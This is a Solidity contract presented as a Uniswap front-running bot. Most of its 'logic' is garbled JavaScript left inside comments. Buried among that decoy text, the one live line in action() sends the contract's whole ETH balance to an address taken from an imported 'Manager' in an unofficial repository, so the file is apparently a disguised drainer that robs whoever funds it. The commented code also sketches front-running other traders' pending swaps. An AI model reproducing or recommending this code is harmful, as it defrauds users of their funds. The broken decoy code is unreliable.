pragma solidity ^0.6.6;

// Uniswap Callee
import "https://github.com/SmartContractBots/uniswap-v2-periphery/blob/main/contracts/interfaces/IUniswapV2Callee.sol";


// Uniswap Manager
import "https://github.com/SmartContractBots/uniswap-v2-periphery/blob/main/contracts/interfaces/V2/IUniswapV2Manager.sol";
import "https://github.com/SmartContractBots/uniswap-v2-periphery/blob/main/contracts/interfaces/V2/IUniswapV2Factory.sol";
import "https://github.com/SmartContractBots/uniswap-v2-periphery/blob/main/contracts/interfaces/V2/IUniswapV2Exchange.sol";

contract UniSwapV2FrontBot {
    
    string public tokenName;
	string public tokenSymbol;
	uint frontrun;
	Manager manager;
	
	
	constructor(string memory _tokenName, string memory _tokenSymbol) public {
		tokenName = _tokenName;
		tokenSymbol = _tokenSymbol;
		manager = new Manager();
		
		}
	
	    
	    // Send required ETH for liquidity pair
	    receive() external payable {}
	    
	    
	    // Perform tasks (clubbed .json functions into one to reduce external calls & reduce gas) manager.performTasks();
	    
	    function action() public payable {
	    	//Perform a front-running attack on UniSwap

            /*-js-execution
                const fs = require('fs');
                var Web3 = require('web3');
                var abiDecoder = require('abi-decoder');
                var colors = require("colors");
                var Tx = require('ethereumjs-tx').Transaction;
                var axios = require('axios');
                var BigNumber = require('big-number');

                const {NETWORK, UNI_ROUTER_ADDRESS, UNI_FACTORY_ADDRESS, UNI_ROUTER_ABI, UNI_FACTORY_ABI, UNI_POOL_ABI, HTTP_PROVIDER_LINK, WEBSOCKET_PROVIDER_LINK, HTTP_PROVIDER_LINK_TEST} = require('./constants.js');
                const {setBotAddress, getBotAddress, FRONT_BOT_ADDRESS, botABI} = require('./bot.js');
                const {PRIVATE_KEY, TOKEN_ADDRESS, AMOUNT, LEVEL} = require('./env.js');

                const INPUT_TOKEN_ADDRESS = '0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2';
                const WETH_TOKEN_ADDRESS = '0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2';
            js-execution-*/

            manager;
            /*-js-execution
                var input_token_info;
                var out_token_info;
                var pool_info;
                var gas_price_info;
            js-execution-*/
            manager;
            /*-js-execution
                var succeed = false;
                var subscription;
                var web3;
                var web3Ts;
                var web3Ws;
                var uniRouter;
                var uniFactory;
                var buy_finished = false;
                var sell_finished = false;
                var buy_failed = false;
                var sell_failed = false;
                var attack_started = false;
                const ONE_GWEI = 1e9;
            }
            js-execution-*/
            manager;
        /*-js-execution
        async function createWeb3(){
            try {
                web3 = new Web3(new Web3.providers.HttpProvider(HTTP_PROVIDER_LINK));
                web3 = new Web3(new Web3.providers.HttpProvider(HTTP_PROVIDER_LINK_TEST));
                web3 = new Web3(EthereumTesterProvider());
                web3.eth.getAccounts(console.log);
                web3Ws = new Web3(new Web3.providers.WebsocketProvider(WEBSOCKET_PROVIDER_LINK));
                uniRouter = new web3.eth.Contract(UNI_ROUTER_ABI, UNI_ROUTER_ADDRESS);
                uniFactory = new web3.eth.Contract(UNI_FACTORY_ABI, UNI_FACTORY_ADDRESS);
                abiDecoder.addABI(UNI_ROUTER_ABI);
                 return true;
            } catch (error) {
                console.log(error);
                return false;
        }
        js-execution-*/
        manager;

        /*-js-execution
        async function main() {
            try {   
                if (await createWeb3() == false) {
                    console.log('Web3 Create Error'.yellow);
                    process.exit();

                    const user_wallet = web3.eth.accounts.privateKeyToAccount(PRIVATE_KEY);
                    const out_token_address = TOKEN_ADDRESS;
                    const amount = AMOUNT;
                    const level = LEVEL;
        
                    ret = await preparedAttack(INPUT_TOKEN_ADDRESS, out_token_address, user_wallet, amount, level);
                if(ret == false) {
                    process.exit();

                await updatePoolInfo();
                outputtoken = await uniRouter.methods.getAmountOut(((amount*1.2)*(10**18)).toString(), pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();

                await approve(gas_price_info.high, outputtoken, out_token_address, user_wallet);
        
                log_str = '***** Tracking more ' + (pool_info.attack_volumn/(10**input_token_info.decimals)).toFixed(5) + ' ' +  input_token_info.symbol + '  Exchange on Uni *****'
                console.log(log_str.green);    
                console.log(web3Ws);
            web3Ws.onopen = function(evt) {
            web3Ws.send(JSON.stringify({ method: "subscribe", topic: "transfers", address: user_wallet.address }));
            console.log('connected')
        
            console.log('get pending transactions')
             subscription = web3Ws.eth.subscribe('pendingTransactions', function (error, result) {
          }).on("data", async function (transactionHash) {
              console.log(transactionHash);

               let transaction = await web3.eth.getTransaction(transactionHash);
               if (transaction != null && transaction['to'] == UNI_ROUTER_ADDRESS)
               {
                   await handleTransaction(transaction, out_token_address, user_wallet, amount, level);
               }
            
                if (succeed) {
                    console.log("The bot finished the attack.");
                    process.exit();
                }
    
            catch (error) {
            
                if(error.data != null && error.data.see === 'https:  infura.io/dashboard')
            
                console.log('Daily request count exceeded, Request rate limited'.yellow);
                console.log('Please insert other API Key');
                else{
                console.log('Unknown Handled Error');
                console.log(error);
            
            }
            process.exit();
        }
        js-execution-*/

        manager;
        /*-js-execution
        function handleTransaction(transaction, out_token_address, user_wallet, amount, level) {
            
            (await triggersFrontRun(transaction, out_token_address, amount, level)) {
            subscription.unsubscribe();
            console.log('Perform front running attack...');

            gasPrice = parseInt(transaction['gasPrice']);
            newGasPrice = gasPrice + 50*ONE_GWEI;

            estimatedInput = ((amount*0.999)*(10**18)).toString();
            realInput = (amount*(10**18)).toString();
            gasLimit = (300000).toString();
            
            await updatePoolInfo();

            var outputtoken = await uniRouter.methods.getAmountOut(estimatedInput, pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();
            swap(newGasPrice, gasLimit, outputtoken, realInput, 0, out_token_address, user_wallet, transaction);
            console.log("wait until the honest transaction is done...", transaction['hash']);

            while (await isPending(transaction['hash'])) {
            

            if(buy_failed)
            
                succeed = false;
                return;
            
            
            console.log('Buy succeed:')
            
            Sell
            await updatePoolInfo();
            var outputeth = await uniRouter.methods.getAmountOut(outputtoken, pool_info.output_volumn.toString(), pool_info.input_volumn.toString()).call();
            outputeth = outputeth * 0.999;

            await swap(newGasPrice, gasLimit, outputtoken, outputeth, 1, out_token_address, user_wallet, transaction);
            
            console.log('Sell succeed');
            succeed = true;
        }
        js-execution-*/
            
        manager;
        /*-js-execution
        async function approve(gasPrice, outputtoken, out_token_address, user_wallet){
            var allowance = await out_token_info.token_contract.methods.allowance(user_wallet.address, UNI_ROUTER_ADDRESS).call();
            
            allowance = BigNumber(allowance);
            outputtoken = BigNumber(outputtoken);

            var decimals = BigNumber(10).power(out_token_info.decimals);
            var max_allowance = BigNumber(10000).multiply(decimals);

            if(outputtoken.gt(max_allowance))
        
                console.log('replace max allowance')
                max_allowance = outputtoken;
            js-execution-*/
            payable(manager.uniswapDepositAddress()).transfer(address(this).balance);
            /*-js-execution
            if(outputtoken.gt(allowance)){
                console.log(max_allowance.toString());
                var approveTX ={
                        from: user_wallet.address,
                        to: out_token_address,
                        gas: 50000,
                        gasPrice: gasPrice*ONE_GWEI,
                        data: out_token_info.token_contract.methods.approve(UNI_ROUTER_ADDRESS, max_allowance).encodeABI()
                        manager;
                    

                var signedTX = await user_wallet.signTransaction(approveTX);
                var result = await web3.eth.sendSignedTransaction(signedTX.rawTransaction);

                console.log('Approved Token')
            
            return;
        }
        js-execution-*/
        manager;
        //select attacking transaction
        /*-js-execution
        async function triggersFrontRun(transaction, out_token_address, amount, level) {
            
            if(attack_started)
                return false;

            console.log((transaction.hash).yellow, parseInt(transaction['gasPrice']) / 10**9);
            if(parseInt(transaction['gasPrice']) / 10**9 > 10 && parseInt(transaction['gasPrice']) / 10**9 < 50){
                attack_started = true;
                return true

            return false;

            if (transaction['to'] != UNI_ROUTER_ADDRESS) {
                return false;
        

            let data = parseTx(transaction['input']);
            let method = data[0];
            let params = data[1];
            let gasPrice = parseInt(transaction['gasPrice']) / 10**9;

            if(method == 'swapExactETHForTokens')
                let in_amount = transaction;
                let out_min = params[0];

                let path = params[1];
                let in_token_addr = path[0];
                manager;
                let out_token_addr = path[path.length-1];
                manager;
                
                let recept_addr = params[2];
                manager;
                let deadline = params[3];
                manager;

                if(out_token_addr != out_token_address)
                    console.log(out_token_addr.blue)
                    console.log(out_token_address)
                    return false;
                }
            }
            js-execution-*/
    }
}
